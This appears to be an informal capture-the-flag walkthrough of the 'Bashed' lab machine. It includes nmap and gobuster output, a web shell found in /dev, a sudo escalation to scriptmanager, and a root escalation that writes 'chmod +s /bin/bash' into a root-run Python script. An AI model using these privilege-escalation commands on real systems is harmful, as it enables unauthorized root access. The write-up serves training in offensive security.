#rustcan
```
Open 10.10.10.68:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-29 03:11 EDT
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:11
Completed NSE at 03:11, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:11
Completed NSE at 03:11, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:11
Completed NSE at 03:11, 0.00s elapsed
Initiating Ping Scan at 03:11
Scanning 10.10.10.68 [4 ports]
Completed Ping Scan at 03:11, 0.13s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 03:11
Completed Parallel DNS resolution of 1 host. at 03:11, 0.12s elapsed
DNS resolution of 1 IPs took 0.12s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 03:11
Scanning 10.10.10.68 [1 port]
Discovered open port 80/tcp on 10.10.10.68
Completed SYN Stealth Scan at 03:11, 0.21s elapsed (1 total ports)
Initiating Service scan at 03:11
Scanning 1 service on 10.10.10.68
Completed Service scan at 03:11, 6.33s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 10.10.10.68
Retrying OS detection (try #2) against 10.10.10.68
Initiating Traceroute at 03:11
Completed Traceroute at 03:11, 0.11s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 03:11
Completed Parallel DNS resolution of 2 hosts. at 03:11, 0.03s elapsed
DNS resolution of 2 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.10.68.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:11
Completed NSE at 03:11, 2.05s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:11
Completed NSE at 03:11, 0.40s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:11
Completed NSE at 03:11, 0.00s elapsed
Nmap scan report for 10.10.10.68
Host is up, received echo-reply ttl 63 (0.099s latency).
Scanned at 2021-07-29 03:11:08 EDT for 13s

PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.4 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 4.2 (95%), Linux 4.8 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=7/29%OT=80%CT=%CU=36703%PV=Y%DS=2%DC=T%G=N%TM=61025499%P=x86_64-pc-linux-gnu)
SEQ(SP=107%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)
OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 198.838 days (since Mon Jan 11 06:03:57 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   97.86 ms 10.10.14.1
2   98.68 ms 10.10.10.68

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:11
Completed NSE at 03:11, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:11
Completed NSE at 03:11, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:11
Completed NSE at 03:11, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.05 seconds
           Raw packets sent: 60 (4.236KB) | Rcvd: 179 (37.268KB)
```
only port 80 was open so i ran gobuster
#enumeration 
```
/.htaccess            (Status: 403) [Size: 295]
/.hta                 (Status: 403) [Size: 290]
/.htpasswd            (Status: 403) [Size: 295]
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]
/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]
/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
/index.html           (Status: 200) [Size: 7743]                                
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]    
/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]   
/server-status        (Status: 403) [Size: 299]                                 
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]
```
On the website we  got a clue for web shell
and a github link as well:https://github.com/Arrexel/phpbash
visited the directories one by one first uploads then php then dev and we get a phpbash.php script the same in the github there.Once we click there we get a web shell
Once we get the webshell used socat to get revrse shell 
#userescalation
Now on doing sudo -l
I got
```
 env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```
Now after searching for scriptmanager 
got a few exploits and ways to escalate from www-data to scriptmanager
a very imp blog
:https://blog.thehackingnomad.com/cheat-sheet-series/privesc-linux
here I found a way 
that is ```sudo -u scriptmanager bash```
to escalate to scriptmanager
#rootescalation 
after escaltion to user
i ran sudo -l got nothing
search for suid binaries
got nothing
search for crontab
nothing
so I quickly ran linpiaz xD
and found few group writable files or writable files
which were not in home directotry
```
/dev/mqueue                                                                                                                                                   
/dev/shm
/home/scriptmanager
/run/lock
/scripts
/scripts/test.py
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
#)You_can_write_even_more_files_inside_last_directory

/var/lib/php/sessions
/var/tmp
/var/www/html/uploads
/var/www/html/uploads/index.html
```
in the /scripts directory I found a test.py and a test.txt
in the test.py file
```
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```
we can edit this file and running ps aux we find that the process is owned by root
so i tried python library hijacking to root
```echo "import os; os.system(\"chmod +s /bin/bash\");" > test.py ```
I waited for a minute and then ran bash -p to get root
